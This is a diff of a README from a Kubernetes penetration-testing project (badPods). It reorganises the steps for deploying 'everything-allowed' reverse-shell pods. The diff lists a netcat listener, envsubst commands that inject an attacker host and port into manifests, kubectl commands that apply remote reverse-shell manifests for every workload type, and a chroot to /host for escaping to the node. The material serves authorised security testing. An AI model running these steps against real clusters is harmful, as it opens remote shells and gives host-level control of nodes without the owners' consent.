@@ -70,18 +70,20 @@ kubectl exec -it everything-allowed-exec-daemonset-[ID] -- chroot /host bash
 ## Reverse shell pods
 Create one or more of these resources and catch reverse shell
 
+**Generic resource type creation example***
+Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
 
-**Set up listener**
+**Step 1: Set up listener**
 ```bash
 nc -nvlp 3116
 ```
 
-**Create pod from local manifest without modifying it by using env variables and envsubst**
+**Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**
 ```bash
-HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/[RESOURCE_TYPE]/everything-allowed-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
 ```
 
-**Catch the shell and chroot to /host **
+**Step 3: Catch the shell and chroot to /host**
 ```bash
 $ nc -nvlp 3116
 Listening on 0.0.0.0 3116
@@ -89,12 +91,38 @@ Connection received on 10.0.0.162 42035
 # chroot /host
 ```
 
-**Generic resource type creation example***
-Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+**Pod**  
 ```bash
-HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/[RESOURCE_TYPE]/everything-allowed-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml
 ```
-
+**Job**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/job/everything-allowed-revshell-job.yaml 
+```
+**CronJob**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/cronjob/everything-allowed-revshell-cronjob.yaml 
+```
+**Deployment**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/deployment/everything-allowed-revshell-deployment.yaml 
+```
+**StatefulSet (This manifest also creates a service)**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/statefulset/everything-allowed-revshell-statefulset.yaml
+```
+**ReplicaSet**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/replicaset/everything-allowed-revshell-replicaset.yaml
+```
+**ReplicationController**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/replicationcontroller/everything-allowed-revshell-replicationcontroller.yaml
+```
+**DaemonSet**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/daemonset/everything-allowed-revshell-daemonset.yaml 
+```
 
 ## Deleting resources
 You can delete a resource using it's manifest, or by name: 
